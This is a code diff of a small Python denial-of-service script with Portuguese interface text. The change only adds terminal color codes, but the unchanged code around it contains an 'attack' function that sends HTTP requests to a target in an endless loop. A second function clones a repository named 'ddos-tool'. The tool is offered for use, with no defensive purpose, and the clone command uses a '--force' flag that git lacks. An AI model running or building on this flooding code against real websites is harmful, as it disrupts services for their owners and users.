@@ -11,32 +11,32 @@ import time
 TARGET = ""
 
 LOGO = """
- ######   ####    ######   #### 
+\033[92m ######   ####    ######   #### 
      ##  #    #       ##  #    #
      ##  #    #       ##  #    #
  #   ##  #    #  #    ##  #    #   
   ####    ####    #####    ####  
-"""
+\033[0m"""
 
 def attack(target):
     while True:
         try:
             response = requests.get(target)
-            print("Request sent to:", target)
+            print("\033[92mRequest sent to:\033[0m", target)
         except Exception as e:
-            print("Failed to send request:", e)
+            print("\033[91mFailed to send request:\033[0m", e)
         time.sleep(random.uniform(0.5, 2.0))
 
 def clone_repository(stdscr):
     stdscr.clear()
     height, width = stdscr.getmaxyx()
-    stdscr.addstr(0, (width // 2) - 15, "Clonando repositório...")
+    stdscr.addstr(0, (width // 2) - 15, "\033[92mClonando repositório...\033[0m")
     stdscr.refresh()
     
     subprocess.run(["git", "clone", "--force", "https://github.com/JOJOofSouls/ddos-tool.git"])
     
-    stdscr.addstr(2, (width // 2) - 15, "Repositório clonado com sucesso!")
-    stdscr.addstr(3, (width // 2) - 15, "Pressione qualquer tecla para continuar...")
+    stdscr.addstr(2, (width // 2) - 15, "\033[92mRepositório clonado com sucesso!\033[0m")
+    stdscr.addstr(3, (width // 2) - 15, "\033[92mPressione qualquer tecla para continuar...\033[0m")
     stdscr.getch()
 
 def main(stdscr):
